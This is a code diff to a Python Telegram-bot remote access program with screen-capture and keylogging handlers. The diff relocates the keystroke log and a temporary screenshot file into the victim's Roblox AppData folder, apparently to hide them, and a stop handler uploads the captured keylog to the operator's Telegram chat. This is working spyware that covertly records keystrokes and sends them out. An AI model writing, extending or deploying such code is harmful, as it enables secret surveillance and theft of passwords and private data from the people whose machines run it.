@@ -361,8 +361,8 @@ def close_video(message):
     except Exception as e:
         bot.reply_to(message, f"Error when closing the video: {str(e)}", reply_markup=create_keyboard())
 
-    
-image_path = rf"C:\Users\{username}\AppData\Local\Roblox\Images\temp_image.jpg"
+image_name = "temp_image.jpg"
+image_path = os.path.join(save_dir_img, image_name)
 screen_thread = None
 root = None
 root1 = None
@@ -523,13 +523,13 @@ def stop_screen_command(message):
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())
 
-KEYLOG_FILE = rf'C:\Users\{username}\AppData\Local\keylog.txt'
+keylog_file = rf'C:\Users\{username}\AppData\Local\Roblox\keylog.txt'
 
 listener = None
 listening = False
 
 def write_to_file(key):
-    with open(KEYLOG_FILE, 'a', encoding='utf-8') as f:
+    with open(keylog_file, 'a', encoding='utf-8') as f:
         f.write(f'{key}\n')
 
 def on_press(key):
@@ -575,8 +575,8 @@ def stop_listening(message):
             return
         stop_keylogger()
         bot.send_message(message.chat.id, "Stopped listening to keyboard events", reply_markup=create_keyboard())
-        if os.path.exists(KEYLOG_FILE):
-            with open(KEYLOG_FILE, 'rb') as file:
+        if os.path.exists(keylog_file):
+            with open(keylog_file, 'rb') as file:
                 bot.send_document(message.chat.id, file)
         else:
             bot.send_message(message.chat.id, "No keylog file found", reply_markup=create_keyboard())
